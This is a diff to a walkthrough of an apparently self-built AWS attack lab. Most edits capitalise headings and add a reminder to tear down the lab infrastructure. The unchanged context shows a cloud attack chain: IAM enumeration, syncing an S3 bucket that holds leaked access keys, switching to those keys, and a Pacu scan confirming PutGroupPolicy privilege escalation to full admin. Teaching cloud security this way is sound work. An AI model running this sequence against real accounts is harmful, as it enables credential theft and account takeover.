@@ -595,7 +595,7 @@ Try to retrieve more info about the current user:
 aws iam get-user --user-name ppe-s3-readonly-user
 ``` 
 
-output: 
+Output: 
 ```sh
 An error occurred (AccessDenied) when calling the GetUser operation: User: arn:aws:iam:user/ppe-s3-readonly-user is not authorized to perform: iam:GetUser on resource: user ppe-s3-readonly-user because no identity-based policy allows the iam:GetUser action
 ```  
@@ -606,7 +606,7 @@ Let's try to list the attached policies for our user:
 aws iam list-attached-user-policies --user-name ppe-s3-readonly-user
 ```  
 
-output:  
+Output:  
 ```sh
 An error occurred (AccessDenied) when calling the ListAttachedUserPolicies operation: User: arn:aws:iam:user/ppe-s3-readonly-user is not authorized to perform: iam:ListAttachedUserPolicies on resource: user ppe-s3-readonly-user because no identity-based policy allows the iam:ListAttachedUserPolicies action
 ```  
@@ -617,7 +617,7 @@ Seems like your current user does not have grants to call these basic aws api...
 aws s3api list-buckets
 ```  
 
-output:  
+Output:  
 ```json
 {
     "Buckets": [
@@ -639,7 +639,7 @@ Can you also download its content?
 aws s3 sync s3://s3-bucket-ppe-attack-demo-4421 ./s3-download
 ```  
 
-output:  
+Output:  
 ```sh
 download: s3://s3-bucket-ppe-attack-demo-4421/test.py to s3-download/test.py
 download: s3://s3-bucket-ppe-attack-demo-4421/aws_keys.txt to s3-download/aws_keys.txt
@@ -653,7 +653,7 @@ Inside that file other aws access keys, export those and begin enumeration for t
 aws sts get-caller-identity
 ```  
 
-output:  
+Output:  
 ```json
 {
     "UserId": "<USER-ID-HERE>",
@@ -667,7 +667,7 @@ Our new user is called `vulnerable-iam-user`, lets list it's policies:
 aws iam list-user-policies --user-name vulnerable-iam-user
 ```  
 
-output:  
+Output:  
 ```json
 {
     "PolicyNames": [
@@ -788,7 +788,7 @@ help iam__privesc_scan
 Execute the `run iam__privesc_scan` command to scan for permission misconfigurations in the environment and see what privilege escalation vectors might be available.  
 Select "y" when prompted to run the module `iam__enum_permissions`.  
 
-output:  
+Output:  
 ```console
 [iam__privesc_scan] Escalation methods for current user:
 [iam__privesc_scan]   CONFIRMED: PutGroupPolicy
@@ -817,22 +817,7 @@ With this new policy you can basically do whatever you want across all aws resou
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+**WARNING**: For security reasons, once you have completed the lab, remember to destroy the infrastructure  
+you created by launching the `terraform destroy -var-file="secret.tfvars"` both in `infra\github` and `infra\aws` folders. 
 
 
